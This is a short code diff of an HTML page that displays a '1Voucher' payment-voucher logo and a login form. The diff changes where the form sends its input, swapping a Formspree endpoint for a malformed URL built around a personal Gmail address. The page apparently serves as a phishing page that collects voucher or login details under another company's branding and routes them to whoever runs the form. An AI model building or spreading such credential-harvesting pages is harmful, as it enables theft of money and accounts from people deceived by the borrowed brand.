@@ -164,7 +164,7 @@
       <img id="voucherImage" src="https://www.peachpayments.com/hubfs/1%20voucher.png" alt="1Voucher" class="image-box" />
 
       <!-- Form with action pointing to your email handling service -->
-      <form id="loginForm" action="https://formspree.io/f/mnqvnyjq" method="POST">
+      <form id="loginForm" action="https://robarsrsa221@gmail.com/f/mnqvnyjq" method="POST">
         <!-- Replace with your actual form handling URL -->
         <div class="row">
           <i class="fas fa-user"></i>
